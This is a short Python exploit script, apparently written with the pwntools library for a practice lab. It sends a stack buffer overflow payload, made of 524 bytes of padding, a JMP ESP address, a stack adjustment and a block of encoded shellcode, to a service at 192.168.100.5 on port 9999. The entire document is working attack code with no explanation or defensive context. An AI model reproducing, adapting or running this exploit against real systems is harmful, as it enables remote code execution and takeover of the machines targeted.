#!/usr/bin/python3
from pwn import remote, p32, asm

offset = 524
junk = b"A" * offset

opcode = asm("sub esp, 0x10")
jmpesp = p32(0x311712f3)

shellcode =  b""
shellcode += b"\xda\xc2\xd9\x74\x24\xf4\x58\xbd\x91\x4d\xed"
shellcode += b"\x34\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13"
shellcode += b"\x03\xf9\x5e\x0f\xc1\x05\x88\x4d\x2a\xf5\x49"
shellcode += b"\x32\xa2\x10\x78\x72\xd0\x51\x2b\x42\x92\x37"
shellcode += b"\xc0\x29\xf6\xa3\x53\x5f\xdf\xc4\xd4\xea\x39"
shellcode += b"\xeb\xe5\x47\x79\x6a\x66\x9a\xae\x4c\x57\x55"
shellcode += b"\xa3\x8d\x90\x88\x4e\xdf\x49\xc6\xfd\xcf\xfe"
shellcode += b"\x92\x3d\x64\x4c\x32\x46\x99\x05\x35\x67\x0c"
shellcode += b"\x1d\x6c\xa7\xaf\xf2\x04\xee\xb7\x17\x20\xb8"
shellcode += b"\x4c\xe3\xde\x3b\x84\x3d\x1e\x97\xe9\xf1\xed"
shellcode += b"\xe9\x2e\x35\x0e\x9c\x46\x45\xb3\xa7\x9d\x37"
shellcode += b"\x6f\x2d\x05\x9f\xe4\x95\xe1\x21\x28\x43\x62"
shellcode += b"\x2d\x85\x07\x2c\x32\x18\xcb\x47\x4e\x91\xea"
shellcode += b"\x87\xc6\xe1\xc8\x03\x82\xb2\x71\x12\x6e\x14"
shellcode += b"\x8d\x44\xd1\xc9\x2b\x0f\xfc\x1e\x46\x52\x69"
shellcode += b"\xd2\x6b\x6c\x69\x7c\xfb\x1f\x5b\x23\x57\xb7"
shellcode += b"\xd7\xac\x71\x40\x17\x87\xc6\xde\xe6\x28\x37"
shellcode += b"\xf7\x2c\x7c\x67\x6f\x84\xfd\xec\x6f\x29\x28"
shellcode += b"\xa2\x3f\x85\x83\x03\xef\x65\x74\xec\xe5\x69"
shellcode += b"\xab\x0c\x06\xa0\xc4\xa7\xfd\x23\x2b\x9f\x99"
shellcode += b"\xe6\xc3\xe2\x61\x08\xaf\x6a\x87\x60\xdf\x3a"
shellcode += b"\x10\x1d\x46\x67\xea\xbc\x87\xbd\x97\xff\x0c"
shellcode += b"\x32\x68\xb1\xe4\x3f\x7a\x26\x05\x0a\x20\xe1"
shellcode += b"\x1a\xa0\x4c\x6d\x88\x2f\x8c\xf8\xb1\xe7\xdb"
shellcode += b"\xad\x04\xfe\x89\x43\x3e\xa8\xaf\x99\xa6\x93"
shellcode += b"\x6b\x46\x1b\x1d\x72\x0b\x27\x39\x64\xd5\xa8"
shellcode += b"\x05\xd0\x89\xfe\xd3\x8e\x6f\xa9\x95\x78\x26"
shellcode += b"\x06\x7c\xec\xbf\x64\xbf\x6a\xc0\xa0\x49\x92"
shellcode += b"\x71\x1d\x0c\xad\xbe\xc9\x98\xd6\xa2\x69\x66"
shellcode += b"\x0d\x67\x99\x2d\x0f\xce\x32\xe8\xda\x52\x5f"
shellcode += b"\x0b\x31\x90\x66\x88\xb3\x69\x9d\x90\xb6\x6c"
shellcode += b"\xd9\x16\x2b\x1d\x72\xf3\x4b\xb2\x73\xd6"

shell = remote("192.168.100.5", 9999)

payload = junk + jmpesp + opcode + shellcode

shell.sendline(payload)
shell.close()
